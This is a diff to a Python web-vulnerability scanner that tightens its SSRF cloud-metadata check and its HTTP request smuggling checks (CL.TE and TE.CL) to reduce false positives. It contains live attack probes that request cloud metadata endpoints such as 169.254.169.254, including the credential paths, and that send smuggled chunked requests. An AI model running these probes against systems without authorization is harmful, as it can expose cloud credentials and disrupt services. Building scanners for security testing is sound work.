@@ -4952,23 +4952,50 @@ class ToolImplementations(WAFBypassScannerMixin):
             "DigitalOcean": "http://169.254.169.254/metadata/v1/",
             "Alibaba": "http://100.100.100.200/latest/meta-data/",
         }
+        # ponytail FIX#17: cloud-specific metadata signatures (NOT generic len>50)
+        # Real metadata responses contain specific keys, not HTML
+        cloud_signatures = {
+            "AWS": ["ami-id", "instance-id", "security-credentials", "iam/", "placement/"],
+            "GCP": ["computeMetadata", "project-id", "instance-id", "service-accounts/"],
+            "Azure": ["vmId", "location", "resourceGroupName", "subscriptionId"],
+            "DigitalOcean": ["droplet_id", "region", "interfaces"],
+            "Alibaba": ["instance-id", "image-id", "region-id"],
+        }
         findings = []
         if HAS_REQUESTS:
+            # Get baseline for diff
+            baseline_text = ""
+            try:
+                baseline_resp = requests.get(target, timeout=10, verify=False)
+                baseline_text = baseline_resp.text[:500]
+            except Exception:
+                pass
             for cloud, endpoint in cloud_endpoints.items():
                 try:
                     resp = requests.get(f"{target}?{param}={endpoint}", timeout=10, verify=False)
                     if resp.status_code == 200 and len(resp.text) > 50:
-                        findings.append({
-                            "type": "SSRF_CLOUD_METADATA", "severity": "CRITICAL",
-                            "cloud": cloud, "endpoint": endpoint,
-                            "response_length": len(resp.text),
-                            "preview": resp.text[:200],
-                        })
+                        text_lower = resp.text.lower()
+                        # ponytail FIX#17: require cloud-specific signature (NOT just any 200 response)
+                        # Also require response differs from baseline (avoid false positive on app homepage)
+                        signatures = cloud_signatures.get(cloud, [])
+                        has_signature = any(sig.lower() in text_lower for sig in signatures)
+                        is_baseline = resp.text[:500] == baseline_text
+                        is_html = "<html" in text_lower or "<!doctype" in text_lower
+                        if has_signature and not is_baseline and not is_html:
+                            findings.append({
+                                "type": "SSRF_CLOUD_METADATA", "severity": "CRITICAL",
+                                "cloud": cloud, "endpoint": endpoint,
+                                "response_length": len(resp.text),
+                                "preview": resp.text[:200],
+                                "matched_signature": next((s for s in signatures if s.lower() in text_lower), ""),
+                            })
                 except Exception:
                     pass
         return ScanResult(
             tool="ssrf_cloud_metadata", target=target, status="success",
-            data={"findings": findings}, confidence="HIGH" if findings else "MEDIUM"
+            data={"clouds_tested": len(cloud_endpoints), "findings": findings},
+            findings=findings,
+            confidence="HIGH" if findings else "MEDIUM"
         ).to_dict()
 
     def lfi_test(self, target: str, param: str = "file") -> Dict:
@@ -5449,26 +5476,29 @@ class ToolImplementations(WAFBypassScannerMixin):
         findings = []
         if HAS_REQUESTS:
             # CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
-            payloads = [
-                "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
-            ]
-            for payload in payloads:
-                try:
-                    # Try sending with both headers
-                    resp = requests.post(target, data="0\r\n\r\nSMUGGLED",
-                                         headers={"Content-Length": "13", "Transfer-Encoding": "chunked"},
-                                         timeout=10, verify=False)
-                    if "SMUGGLED" in resp.text or resp.status_code == 400:
-                        findings.append({
-                            "type": "HTTP_SMUGGLE_CLTE",
-                            "severity": "HIGH",
-                            "status_code": resp.status_code,
-                        })
-                except Exception:
-                    pass
+            # ponytail FIX#15: status_code 400 alone is NOT smuggling (server correctly rejects malformed request)
+            # Real smuggling indicator: SMUGGLED string reflected in response OR response timing anomaly
+            try:
+                # Send smuggled payload
+                resp = requests.post(target, data="0\r\n\r\nSMUGGLED",
+                                     headers={"Content-Length": "13", "Transfer-Encoding": "chunked"},
+                                     timeout=10, verify=False)
+                # Real smuggling: SMUGGLED string appears in response (back-end processed it)
+                if "SMUGGLED" in resp.text:
+                    findings.append({
+                        "type": "HTTP_SMUGGLE_CLTE",
+                        "severity": "HIGH",
+                        "status_code": resp.status_code,
+                        "evidence": "SMUGGLED string reflected in response",
+                    })
+                # Note: status_code 400 alone is NOT a finding — servers correctly reject malformed requests
+            except Exception:
+                pass
         return ScanResult(
             tool="http_smuggle_clte", target=target, status="success",
-            data={"findings": findings}, confidence="LOW"
+            data={"payloads_tested": 1, "findings": findings},
+            findings=findings,  # ponytail FIX#15: top-level findings
+            confidence="HIGH" if findings else "LOW"
         ).to_dict()
 
     def http_smuggle_tecl(self, target: str) -> Dict:
@@ -5479,17 +5509,21 @@ class ToolImplementations(WAFBypassScannerMixin):
                 resp = requests.post(target, data="SMUGGLED",
                                      headers={"Transfer-Encoding": "chunked", "Content-Length": "3"},
                                      timeout=10, verify=False)
-                if resp.status_code == 400 or "SMUGGLED" in resp.text:
+                # ponytail FIX#15: require SMUGGLED reflection, not just status_code 400
+                if "SMUGGLED" in resp.text:
                     findings.append({
                         "type": "HTTP_SMUGGLE_TECL",
                         "severity": "HIGH",
                         "status_code": resp.status_code,
+                        "evidence": "SMUGGLED string reflected in response",
                     })
             except Exception:
                 pass
         return ScanResult(
             tool="http_smuggle_tecl", target=target, status="success",
-            data={"findings": findings}, confidence="LOW"
+            data={"payloads_tested": 1, "findings": findings},
+            findings=findings,
+            confidence="HIGH" if findings else "LOW"
         ).to_dict()
 
     def subdomain_takeover_check(self, domain: str, subdomain: str = "") -> Dict:
